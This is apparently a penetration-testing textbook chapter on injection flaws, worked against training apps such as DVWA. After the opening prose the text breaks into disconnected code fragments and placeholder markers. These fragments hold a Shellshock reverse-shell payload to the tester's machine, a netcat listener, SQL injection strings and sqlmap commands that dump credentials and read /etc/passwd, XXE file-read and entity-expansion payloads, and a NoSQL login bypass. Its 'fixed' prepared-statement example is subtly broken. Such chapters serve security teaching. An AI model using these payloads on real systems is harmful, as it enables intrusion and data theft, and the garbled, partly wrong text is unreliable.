- en: Detecting and Exploiting Injection-Based Flaws
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: According to the OWASP Top 10 2013 list ([https://www.owasp.org/index.php/Top_10_2013-Top_10](https://www.owasp.org/index.php/Top_10_2013-Top_10)), the
    most critical flaw in web applications is the injection flaw, and it has maintained
    its position in the 2017 list
  prefs: []
  type: TYPE_NORMAL
- en: ([https://www.owasp.org/index.php/Top_10-2017_Top_10](https://www.owasp.org/index.php/Top_10-2017_Top_10))
    release candidate. Interactive web applications take the input from the user,
    process it, and return the output to the client. When the application is vulnerable
    to an injection flaw, it accepts the input from the user without proper or even
    with any validation and still processes it. This results in actions that the application
    did not intend to perform. The malicious input tricks the application, forcing
    the underlying components to perform tasks for which the application was not programmed.
    In other words, an injection flaw allows the attacker to control components of
    the application at will.
  prefs: []
  type: TYPE_NORMAL
- en: 'In this chapter, we will discuss the major injection flaws in today''s web
    applications, including tools to detect and exploit them, and how to avoid being
    vulnerable or to fix existing flaws. These flaws include the following:'
  prefs: []
  type: TYPE_NORMAL
- en: Command injection flaw
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: SQL injection flaw
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: XML-based injections
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: NoSQL injections
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'An injection flaw is used to gain access to the underlying component to which
    the application is sending data, to execute some task. The following table shows
    the most common components used by web applications that are often targeted by
    an injection attack when the input from the user is not sanitized by the application:'
  prefs: []
  type: TYPE_NORMAL
- en: '| **Components** | **Injection flaws** |'
  prefs: []
  type: TYPE_TB
- en: '| --- | --- |'
  prefs: []
  type: TYPE_TB
- en: '| Operating system | Command injection |'
  prefs: []
  type: TYPE_TB
- en: '| Database | SQL/NoSQL injection |'
  prefs: []
  type: TYPE_TB
- en: '| Web browser / client | Cross-Site Scripting |'
  prefs: []
  type: TYPE_TB
- en: '| LDAP directory | LDAP injection |'
  prefs: []
  type: TYPE_TB
- en: '| XML | XPATH / XML External Entity injection |'
  prefs: []
  type: TYPE_TB
- en: Command injection
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Web applications, which are dynamic in nature, may use scripts to invoke some
    functionality within the operating system on the web server to process the input
    received from the user. An attacker may try to get this input processed at the
    command line by circumventing the input validation filters implemented by the
    application. **Command injection** usually invokes commands on the same web server,
    but it is possible that the command can be executed on a different server, depending
    on the architecture of the application.
  prefs: []
  type: TYPE_NORMAL
- en: 'Let''s take a look at a simple code snippet, that is vulnerable to a command
    injection flaw, taken from DVWA''s command injection exercise. It is a very simple
    script that receives an IP address and sends pings (ICMP packets) to that address:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE0]'
  prefs: []
  type: TYPE_PRE
- en: As you can see, there is no input validation before accepting the `ip` parameter
    from the user, which makes this code vulnerable to a command injection attack.
    To log in to DVWA, the default credentials are `admin`/`admin`.
  prefs: []
  type: TYPE_NORMAL
- en: 'A malicious user might use the following request to pipe in additional commands,
    which the application would accept without raising an exception:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE1]'
  prefs: []
  type: TYPE_PRE
- en: 'The application takes the value of the user input from the client without validation
    and concatenates it to the `ping -c 3` command in order to build the final command
    that is run on the web server. The response from the server is shown in the following
    screenshot. The version of the underlying OS is displayed along with the result
    of pinging the given address as the application failed to validate the user input:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/00116.jpeg)'
  prefs: []
  type: TYPE_IMG
- en: The additional command injected will run using the privileges of the web server.
    Most web servers nowadays run with restricted privileges, but even with limited
    rights, the attacker can exploit and steal significant information.
  prefs: []
  type: TYPE_NORMAL
- en: Command injection can be used to make the server download and execute malicious
    files by injecting the `wget` commands, or to gain a remote shell to the server,
    as demonstrated in the following example.
  prefs: []
  type: TYPE_NORMAL
- en: 'First, set up a listener in Kali Linux. **Netcat** has a very simple way of
    doing this:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE2]'
  prefs: []
  type: TYPE_PRE
- en: 'Kali Linux is now set to listen for a connection on port `12345`. Next, inject
    the following command into the vulnerable server:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE3]'
  prefs: []
  type: TYPE_PRE
- en: On some modern Linux systems, the original Netcat has been replaced by a version
    that doesn't include some options that may have posed a security risk, such as
    `-e`, which allows the execution of commands upon connection. These systems often
    include the traditional version of Netcat in a command called `nc.traditional`.
    When trying to use Netcat to gain access to a remote system, try both options.
  prefs: []
  type: TYPE_NORMAL
- en: 'Notice that `10.7.7.4` is the IP address of the Kali machine in the example,
    and `12345` is the TCP port listening for the connection. After sending the request,
    you should receive the connection in your Kali Linux and be able to issue commands
    in a noninteractive shell:'
  prefs: []
  type: TYPE_NORMAL
- en: '![](img/00117.jpeg)'
  prefs: []
  type: TYPE_IMG
- en: A noninteractive shell allows you to execute commands and see the results, but
    not interact with the commands nor see the error output, such as when using a
    text editor.
  prefs: []
  type: TYPE_NORMAL
- en: Identifying parameters to inject data
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: 'When you are testing a web application for command injection flaws, and you
    have confirmed that the application is interacting with the command line of the
    underlying OS, the next step is to manipulate and probe the different parameters
    in the application and view their responses. The following parameters should be
    tested for command injection flaws as the application may be using one of these
    parameters to build a command back on the web server:'
  prefs: []
  type: TYPE_NORMAL
- en: '**GET**: With this method, input parameters are sent in URLs. In the example
    shown earlier, the input from the client was passed to the server using the `GET`
    method and was vulnerable to a command injection flaw. Any user-controlled parameter
    sent using the `GET` method request should be tested.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**POST**: In this method, the input parameters are sent in the HTTP body. Similar
    to the input being passed using the `GET` method; data taken from the end user
    can also be passed using the `POST` method in the body of the HTTP request. This
    could then be used by the web application to build a command query on the server
    side.'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**HTTP header**: Applications often use header fields to identify end users
    and display customized information to the user depending on the value in the headers.
    These parameters can also be used by the application to build further queries.
    Some of the important header fields to check for command injection are as follows:'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`Cookies`'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`X-Forwarded-For`'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`User-Agent`'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '`Referrer`'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Error-based and blind command injection
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: When you piggyback a command through an input parameter and the output of the
    command is displayed in the web browser, it becomes easy to identify whether the
    application is vulnerable to a command injection flaw. The output may be in the
    form of an error or the actual result of the command that you tried to run. As
    a penetration tester, you would then modify and add additional commands, depending
    on the shell the application is using, and glean information from the application.
    When the output is displayed in a web browser, it is known as **error-based**
    or **non-blind command injection**.
  prefs: []
  type: TYPE_NORMAL
- en: In the other form of command injection, that is, **blind command injection**,
    the results of the commands that you inject are not displayed to the user and
    no error messages are returned. The attacker will have to rely on other ways to
    identify whether the command was indeed executed on the server. When the output
    of the command is displayed to the user, you can use any of the bash shell or
    Windows commands, such as `ls`, `dir`, `ps`, or `tasklist`, depending on the underlying
    OS. However, when testing for blind injection, you need to select your commands
    carefully. As an ethical hacker, the most reliable and safe way to identify the
    existence of injection flaws when the application does not display the results
    is with the `ping` command.
  prefs: []
  type: TYPE_NORMAL
- en: 'The attacker injects the `ping` command to send network packets to a machine
    under their control and views the results on that machine using a packet capture.
    This may prove to be useful in several ways:'
  prefs: []
  type: TYPE_NORMAL
- en: Since the `ping` command is similar in both Linux and Windows except for a few
    minor changes, the command is sure to run if the application is vulnerable to
    an injection flaw.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: By analyzing the response in the `ping` output, the attacker can also identify
    the underlying OS using the TTL values.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: The response in the `ping` output may also give the attacker some insight on
    the firewall and its rules, as the target environment is allowing ICMP packets
    through its firewall. This may prove to be useful in the later stages of exploitation,
    as the web server has a route to the attacker.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: The `ping` utility is usually not restricted; even if the application is running
    under a nonprivileged account, your chances of getting the command executed is
    guaranteed.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: The input buffer is often limited in size and can only accept a finite number
    of characters, for example, the input field for the username. The `ping` command,
    along with the IP addresses and some additional arguments, can easily be injected
    into these fields.
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Metacharacters for command separator
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In the examples shown earlier, the semicolon was used as a metacharacter, which
    separates the actual input and the command that you are trying to inject. Along
    with the semicolon, there are several other metacharacters that can be used to
    inject commands.
  prefs: []
  type: TYPE_NORMAL
- en: 'The developer may set filters to block the semicolon metacharacter. This would
    block your injected data, and therefore you need to experiment with other metacharacters
    too, as shown in the following table:'
  prefs: []
  type: TYPE_NORMAL
- en: '| **Symbol** | **Usage** |'
  prefs: []
  type: TYPE_TB
- en: '| --- | --- |'
  prefs: []
  type: TYPE_TB
- en: '| `;` | The semicolon is the most common metacharacter used to test an injection
    flaw. The shell runs all of the commands in sequence separated by the semicolon.
    |'
  prefs: []
  type: TYPE_TB
- en: '| `&&` | The double ampersand runs the command to the right of the metacharacter
    only if the command to the left executed successfully.An example would be to inject
    the password field along with the correct credentials. A command can be injected
    that will run once the user is authenticated to the system. |'
  prefs: []
  type: TYPE_TB
- en: '| `&#124;&#124;` | The double pipe metacharacter is the direct opposite of
    the double ampersand. It runs the command on the right-hand side only if the command
    on the left-hand side failed. The following is an example of this command: `**cd
    invalidDir &#124;&#124; ping -c 2 attacker.com**` |'
  prefs: []
  type: TYPE_TB
- en: '| `( )` | Using the grouping metacharacter, you can combine the outputs of
    multiple commands and store them in a file. The following is an example of this
    command: `**(ps; netstat) > running.txt**` |'
  prefs: []
  type: TYPE_TB
- en: '| [PRE4]'
  prefs: []
  type: TYPE_NORMAL
- en: () { :; };
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE5]'
  prefs: []
  type: TYPE_PRE
- en: () { :;}; ping -c 1 192.168.1.1
  prefs: []
  type: TYPE_NORMAL
- en: () { :;}; /bin/ping -c 1 192.168.1.1
  prefs: []
  type: TYPE_NORMAL
- en: () { :;}; bash -c "ping -c 1 192.168.1.1"
  prefs: []
  type: TYPE_NORMAL
- en: () { :;}; /bin/bash -c "ping -c 1 attacker.com"
  prefs: []
  type: TYPE_NORMAL
- en: () { :;}; /bin/sh -c "ping -c 1 192.168.1.1"
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE6]'
  prefs: []
  type: TYPE_PRE
- en: nc -lvp 12345
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE7]'
  prefs: []
  type: TYPE_PRE
- en: () { :;}; /bin/bash -c "ping -c 1 10.7.7.4; bash -i >& /dev/tcp/10.7.7.4/12345
    0>&1"
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE8]'
  prefs: []
  type: TYPE_PRE
- en: use exploit/multi/http/apache_mod_cgi_bash_env_exec
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE9]'
  prefs: []
  type: TYPE_PRE
- en: set SRVHOST 0.0.0.0
  prefs: []
  type: TYPE_NORMAL
- en: set SRVPORT 8080
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE10]'
  prefs: []
  type: TYPE_PRE
- en: SELECT [elements] FROM [table] WHERE [condition]
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE11]'
  prefs: []
  type: TYPE_PRE
- en: SELECT name,description,price FROM products WHERE price<100
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE12]'
  prefs: []
  type: TYPE_PRE
- en: SELECT columnA FROM tableX WHERE columnE='employee' AND columnF=100;
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE13]'
  prefs: []
  type: TYPE_PRE
- en: <?php
  prefs: []
  type: TYPE_NORMAL
- en: $stockID = $_GET["userinput"];
  prefs: []
  type: TYPE_NORMAL
- en: $SQL= "SELECT * FROM books WHERE ID=" . $stockID;
  prefs: []
  type: TYPE_NORMAL
- en: $result= MySQL_query($SQL);
  prefs: []
  type: TYPE_NORMAL
- en: $row = MySQL_fetch_assoc($result);
  prefs: []
  type: TYPE_NORMAL
- en: ?>
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE14]'
  prefs: []
  type: TYPE_PRE
- en: SELECT * FROM books WHERE ID=10-1
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE15]'
  prefs: []
  type: TYPE_PRE
- en: SELECT first_name, last_name FROM users WHERE user_id = '''
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE16]'
  prefs: []
  type: TYPE_PRE
- en: '"SELECT first_name, last_name FROM users WHERE first_name LIKE ''" .'
  prefs: []
  type: TYPE_NORMAL
- en: $name . "'"
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE17]'
  prefs: []
  type: TYPE_PRE
- en: 2' union SELECT schema_name,2 FROM information_schema.schemata -- '
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE18]'
  prefs: []
  type: TYPE_PRE
- en: 2' union SELECT table_name,2 FROM information_schema.tables WHERE table_schema
    = 'dvwa' -- '
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE19]'
  prefs: []
  type: TYPE_PRE
- en: 2' union SELECT table_name,2 FROM information_schema.tables WHERE table_schema
    = 'dvwa' and table_name = 'users' --'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE20]'
  prefs: []
  type: TYPE_PRE
- en: 2' union select concat(user_id,'-',first_name,' ',last_name),concat(user,':',password)
    from dvwa.users -- '
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE21]'
  prefs: []
  type: TYPE_PRE
- en: 1' and database()='dvwa
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE22]'
  prefs: []
  type: TYPE_PRE
- en: 1'+and+char_length(database())=1+--+'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE23]'
  prefs: []
  type: TYPE_PRE
- en: sqlninja -f <path to config file > -m m
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE24]'
  prefs: []
  type: TYPE_PRE
- en: sqlmap -u "http://10.7.7.5/mutillidae/index.php?page=user-info.php&username=admin&password=admin&user-info-php-submit-button=View+Account+Details"
    -p username --schema
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE25]'
  prefs: []
  type: TYPE_PRE
- en: sqlmap -r bodgeit_login.txt -p username --current-db --current-user --threads
    5
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE26]'
  prefs: []
  type: TYPE_PRE
- en: sqlmap -u http://10.7.7.5/bodgeit/login.jsp --data "username=23&password=23"
    -D public --tables
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE27]'
  prefs: []
  type: TYPE_PRE
- en: sqlmap -u http://10.7.7.5/bodgeit/login.jsp --data "username=23&password=23"
    -D public -T users -dump
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE28]'
  prefs: []
  type: TYPE_PRE
- en: sqlmap -u "http://10.7.7.5/mutillidae/index.php?page=user-info.php&username=admin&password=admin&user-info-php-submit-button=View+Account+Details"
    -p username --file-read /etc/passwd
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE29]'
  prefs: []
  type: TYPE_PRE
- en: <rootNode>
  prefs: []
  type: TYPE_NORMAL
- en: <childNode>
  prefs: []
  type: TYPE_NORMAL
- en: <element/>
  prefs: []
  type: TYPE_NORMAL
- en: </childNode>
  prefs: []
  type: TYPE_NORMAL
- en: </rootNode>
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE30]'
  prefs: []
  type: TYPE_PRE
- en: /rootNode/childNode/element
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE31]'
  prefs: []
  type: TYPE_PRE
- en: //Employee[UserName/text()='myuser' And Password/text()='mypassword']
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE32]'
  prefs: []
  type: TYPE_PRE
- en: '.../node[contains(genre, ''$genre_input'')]/node...'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE33]'
  prefs: []
  type: TYPE_PRE
- en: ''')]/*|//*[contains(''1'',''1'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE34]'
  prefs: []
  type: TYPE_PRE
- en: apt-get install python3-pip
  prefs: []
  type: TYPE_NORMAL
- en: pip3 install xcat
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE35]'
  prefs: []
  type: TYPE_PRE
- en: xcat -m <http_method> -c "<cookie value>" <URL_without_parameters> <injecable_parameter>
    <parameter1=value> <parameter2=value> -t "<text_in_true_results>"
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE36]'
  prefs: []
  type: TYPE_PRE
- en: xcat -m GET -c "PHPSESSID=kbh3orjn6b2gpimethf0ucq241;JSESSIONID=9D7765D7D1F2A9FCCC5D972A043F9867;security_level=0"
    http://10.7.7.5/bWAPP/xmli_2.php genre genre=horror action=search -t ">1<"
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE37]'
  prefs: []
  type: TYPE_PRE
- en: <!DOCTYPE test [ <!ENTITY internal-entity "boss" >]>
  prefs: []
  type: TYPE_NORMAL
- en: <reset><login>&internal-entity;</login><secret>Any bugs?</secret></reset>
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE38]'
  prefs: []
  type: TYPE_PRE
- en: <!DOCTYPE test [  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE39]'
  prefs: []
  type: TYPE_PRE
- en: <!DOCTYPE test [  <!ENTITY xxe SYSTEM "expect://uname -a" >]>
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE40]'
  prefs: []
  type: TYPE_PRE
- en: <!DOCTYPE test [
  prefs: []
  type: TYPE_NORMAL
- en: <!ENTITY entity0 "Level0-">
  prefs: []
  type: TYPE_NORMAL
- en: <!ENTITY entity1 "Level1-&entity0;">
  prefs: []
  type: TYPE_NORMAL
- en: <!ENTITY entity2 "Level2-&entity1;&entity1;">
  prefs: []
  type: TYPE_NORMAL
- en: <!ENTITY entity3 "Level3-&entity2;&entity2;&entity2;">
  prefs: []
  type: TYPE_NORMAL
- en: <!ENTITY entity4 "Level4-&entity3;&entity3;&entity3;&entity3;">
  prefs: []
  type: TYPE_NORMAL
- en: <!ENTITY entity5 "Level5-&entity4;&entity4;&entity4;&entity4;&entity4;">
  prefs: []
  type: TYPE_NORMAL
- en: ']>'
  prefs: []
  type: TYPE_NORMAL
- en: <reset><login>&entity0;</login><secret>Any bugs?</secret></reset>
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE41]'
  prefs: []
  type: TYPE_PRE
- en: 'User.find({ username: req.body.username, password: req.body.password }, ...'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE42]'
  prefs: []
  type: TYPE_PRE
- en: '{"username":"admin","password":{"$gt":""}}'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE43]'
  prefs: []
  type: TYPE_PRE
- en: $stmt = $dbh->prepare("SELECT * FROM REGISTRY where name LIKE '%?%'");
  prefs: []
  type: TYPE_NORMAL
- en: $stmt->execute(array($_GET['name']));
  prefs: []
  type: TYPE_NORMAL
- en: '```'
  prefs: []
  type: TYPE_NORMAL
- en: 'Some useful references for this topic are as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '[https://www.owasp.org/index.php/Data_Validation](https://www.owasp.org/index.php/Data_Validation)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet](https://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '[https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet)'
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Summary
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In this chapter, we discussed various injection flaws. An injection flaw is
    a serious vulnerability in web applications, as the attacker can gain complete
    control over the server by exploiting it. We also examined how, through different
    types of injection, a malicious attacker can gain access to the operating system.
    This could then be used to attack other servers on the network. When attackers
    exploit a SQL injection flaw, they can access sensitive data on the backend database.
    This can prove to be devastating to an organization.
  prefs: []
  type: TYPE_NORMAL
- en: In the next chapter we will get to know a particular type of injection vulnerability,
    Cross-Site Scripting, which allows attackers to change the way pages are presented
    to a user by injecting, or tricking the user into injecting, script code in request's
    parameters.
  prefs: []
  type: TYPE_NORMAL
